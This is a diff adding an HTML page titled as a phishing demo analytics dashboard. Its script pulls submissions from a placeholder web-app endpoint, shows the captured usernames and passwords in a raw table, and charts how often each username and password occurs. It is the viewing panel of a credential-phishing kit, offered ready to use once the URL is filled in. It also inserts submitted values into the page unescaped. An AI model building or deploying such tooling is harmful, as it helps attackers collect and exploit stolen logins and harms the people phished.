@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Phishing Demo Dashboard</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background: #f4f6f9;
+        }
+
+        .header {
+            background: #343a40;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 20px;
+        }
+
+        .card {
+            background: #fff;
+            padding: 20px;
+            margin-bottom: 25px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 12px rgba(0,0,0,0.08);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th, td {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        th {
+            background: #007bff;
+            color: white;
+        }
+
+        canvas {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+<div class="header">
+    <h1>📊 Phishing Demo – Analytics Dashboard</h1>
+</div>
+
+<div class="container">
+
+    <!-- Stats Card -->
+    <div class="card">
+        <h2>Overview</h2>
+        <p><b>Total submissions:</b> <span id="total"></span></p>
+    </div>
+
+    <!-- Chart Row -->
+    <div class="card">
+        <h2>Usernames Chart</h2>
+        <canvas id="usernameChart" height="120"></canvas>
+    </div>
+
+    <div class="card">
+        <h2>Password Frequency Chart</h2>
+        <canvas id="passwordChart" height="120"></canvas>
+    </div>
+
+    <!-- Data Table -->
+    <div class="card">
+        <h2>Raw Submission Data</h2>
+        <div id="table"></div>
+    </div>
+
+</div>
+
+<script>
+const url = "YOUR_WEB_APP_URL_HERE?action=getData";  // <-- CHANGE THIS
+
+fetch(url)
+  .then(res => res.json())
+  .then(data => {
+      renderTable(data);
+      buildCharts(data);
+      document.getElementById("total").innerText = data.length - 1;
+  })
+  .catch(err => {
+      document.getElementById("table").innerHTML = "<p>Error loading data</p>";
+  });
+
+
+function renderTable(rows) {
+    let html = "<table><tr>";
+    rows[0].forEach(col => html += `<th>${col}</th>`);
+    html += "</tr>";
+
+    rows.slice(1).forEach(r => {
+        html += "<tr>";
+        r.forEach(c => html += `<td>${c}</td>`);
+        html += "</tr>";
+    });
+
+    html += "</table>";
+    document.getElementById("table").innerHTML = html;
+}
+
+function buildCharts(rows) {
+    const usernameCounts = {};
+    const passwordCounts = {};
+
+    rows.slice(1).forEach(r => {
+        const username = r[1];
+        const password = r[2];
+
+        usernameCounts[username] = (usernameCounts[username] || 0) + 1;
+        passwordCounts[password] = (passwordCounts[password] || 0) + 1;
+    });
+
+    // Username chart
+    new Chart(document.getElementById("usernameChart"), {
+        type: "bar",
+        data: {
+            labels: Object.keys(usernameCounts),
+            datasets: [{
+                label: "Username Usage",
+                data: Object.values(usernameCounts),
+                backgroundColor: "#007bff"
+            }]
+        }
+    });
+
+    // Password chart
+    new Chart(document.getElementById("passwordChart"), {
+        type: "pie",
+        data: {
+            labels: Object.keys(passwordCounts),
+            datasets: [{
+                data: Object.values(passwordCounts),
+                backgroundColor: [
+                    "#ff6384",
+                    "#36a2eb",
+                    "#ffce56",
+                    "#4bc0c0",
+                    "#9966ff",
+                    "#ff9f40"
+                ]
+            }]
+        }
+    });
+}
+</script>
+
+</body>
+</html>
